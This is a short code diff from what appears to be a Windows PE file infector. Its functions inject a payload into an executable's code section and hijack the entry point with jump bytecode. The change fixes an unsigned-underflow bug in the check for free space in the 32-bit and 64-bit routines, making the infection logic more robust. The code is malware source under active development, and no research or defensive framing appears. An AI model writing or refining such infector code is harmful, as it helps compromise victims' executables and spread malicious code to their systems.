@@ -79,7 +79,8 @@ int pe_infect_section(pe_nt_header* nt_header, list_pe_section_t sections, unsig
 	char hex_original_entry_point[] = { (char)(original_entry_point) & 0xFF, (char)(original_entry_point >> 8) & 0xFF, (char)(original_entry_point >> 16) & 0xFF, (char)(original_entry_point >> 24) & 0xFF };
 	char jmp_eax_nop_bytecode[] = "\xff\xe0\x90";
 	
-	if (codeSect->header.SizeOfRawData - injection_xcode_offset - 8 - (thread_flag ? 0x99 : 0) < xcode_size) {
+	//if (codeSect->header.SizeOfRawData - injection_xcode_offset - 8 - (thread_flag ? 0x99 : 0) < xcode_size) {
+	if (codeSect->header.SizeOfRawData < (xcode_size + injection_xcode_offset + 8 + (thread_flag ? 0x99 : 0))) {
 		//not enough space for xcode
 		return -5;
 	}
@@ -188,7 +189,7 @@ int pe64_infect_section(pe64_nt_header* nt_header, list_pe_section_t sections, u
 										(char)(original_entry_point >> 32) & 0xFF, (char)(original_entry_point >> 40) & 0xFF, (char)(original_entry_point >> 48) & 0xFF, (char)(original_entry_point >> 56) & 0xFF };
 	char jmp_rax_nop_bytecode[] = "\xff\xe0\x90\x90\x90\x90";
 	
-	if (codeSect->header.SizeOfRawData - injection_xcode_offset - 16 < xcode_size) {
+	if (codeSect->header.SizeOfRawData < (xcode_size + injection_xcode_offset + 16)) {
 		//not enough space for xcode
 		return -5;
 	}
